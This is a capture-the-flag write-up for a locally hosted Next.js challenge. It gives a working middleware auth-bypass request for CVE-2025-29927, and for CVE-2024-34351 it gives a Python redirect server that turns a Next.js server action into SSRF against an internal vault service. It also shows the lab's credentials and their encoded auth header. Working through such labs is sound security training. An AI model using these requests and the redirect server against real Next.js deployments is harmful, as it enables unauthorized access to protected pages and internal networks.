install `docker` and `docker-compose`
```sh
cd ./CTFs/04-2025/web/web2
```
then
```sh
sudo docker-compose up
```
then application should build and run on port 3000 locally
![[Pasted image 20250411224644.png]]the 1 st flag will be obtained by bypassing the auth using  [CVE-2025-29927](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass) 
you could've guessed by provided `package.json` file in the description as a **free** hint:
```json
{
  "name": "vulnerable-app",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "@tailwindcss/typography": "^0.5.16",
    "bootstrap": "^5.3.3",
    "emoji-picker-react": "^4.12.2",
    "html2pdf.js": "^0.10.3",
    "jspdf": "^3.0.1",
    "next": "14.0.0",
    "react": "^18",
    "react-dom": "^18",
    "tailwindcss": "^4.0.15"
  },
  "devDependencies": {
    "@types/node": "^20",
    "@types/react": "^18",
    "@types/react-dom": "^18",
    "eslint": "^8",
    "eslint-config-next": "14.0.0",
    "typescript": "^5"
  }
}

```
Next js version as follows:
```json
...
"next": "14.0.0"
...
```
you can use this Poc https://github.com/MuhammadWaseem29/CVE-2025-29927-POC
```http
GET /dashboard HTTP/1.1
Host: 192.168.0.85:3000
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

![[Pasted image 20250411225646.png]]

to bypass the auth and get access to the dashboard, click the "GETFLAG 1" button

**FLAG2 ...**

to get the 2 nd flag you should reach the internal host `http://vault-app:8001`
There was 2 ways to know internal IP of that vault-app
1. Scan the default subnet of docker containers by brute-forcing IP addresses
2. Get the hint for 100 points, in the hint i was shared `docker-compose.yml` used to build the whole application as follows:
```yml
version: '3.8'

networks:
  vault_net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

services:
  next-app:
    build:
      context: ./next-app
    container_name: next-app
    ports:
      - "3000:3000"
    depends_on:
      - vault-app
    networks:
      vault_net:
        ipv4_address: 172.30.0.20
    command: >
      sh -c "npm install &&
             npm run build &&
             npm start"

  vault-app:
    build:
      context: ./vault-internal
      dockerfile: Dockerfile
    container_name: vault-app
    env_file:
      - ./vault-internal/.vault.env
    networks:
      vault_net:
        ipv4_address: 
```
you can see the vault app has given IP of `172.30.0.10` and you can see the port number in the conversation between Intern and DevOps in `/dashboard` page

Here is overall  scenario
![[Pasted image 20250412123417.png]]


Explore how vault-app works (source can be downloded with "Download" button)
App can be authenticated with
`Authorization-Internal: Basic <b64 encoded credentials>`
you can see credentials were  `coder:Employee@2025` . The auth header will be 
`Authorization-Internal:Basic Y29kZXI6RW1wbG95ZWVAMjAyNQ==`

According to the CVE-2024-34351 to exploit you need an attacker server IP that does redirect incoming requests to the internal host , which is `http://172.30.0.10:8001`
. 
Can be constructed with , following python code:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import json

class SimpleHandler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/x-component')
        self.end_headers()

    def do_GET(self):
        ssrf = self.headers.get('ssrf', 'http://172.30.0.10:8001')
        
        log_data = {
            'url': self.path,
            'method': self.command,
            'ssrf': ssrf
        }
        print("Request received: " + json.dumps(log_data))
        print(f"Redirecting to: {ssrf}")

        self.send_response(302)
        self.send_header('Location', ssrf)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Listening on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

and new attack scenario will be:
![[Pasted image 20250412153919.png]]

you need an attacker server should be prepared with public IP (in our case private IP also works because you're deploying the app locally)
![[Pasted image 20250412154820.png]]

SSRF bug was cause by next js actions (can be triggered by clicking "Internal" button)
to achieve the results you should replace your `Host: <attacker-IP>` , `Origin: http(s)://<attacker-IP>`
then we can see the response coming from the vault app here:
![[Pasted image 20250412155156.png]]

and FLAG2:
![[Pasted image 20250412155302.png]]